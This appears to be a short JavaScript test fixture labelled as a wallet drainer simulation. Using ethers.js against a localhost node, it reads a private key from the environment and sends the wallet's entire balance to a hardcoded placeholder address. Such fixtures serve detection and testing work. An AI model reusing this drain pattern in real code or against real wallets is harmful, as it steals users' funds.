// Malicious Code Fixture: Wallet Drainer Simulation
import { ethers } from 'ethers';

async function drainWallet(target) {
  const provider = new ethers.providers.JsonRpcProvider('http://localhost:8545');
  const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

  // Maliciously sending all funds to a hardcoded address
  const tx = await wallet.sendTransaction({
    to: '0x1234567890abcdef1234567890abcdef12345678',
    value: await provider.getBalance(wallet.address),
  });
  console.log('Drained to:', tx.hash);
}

drainWallet();
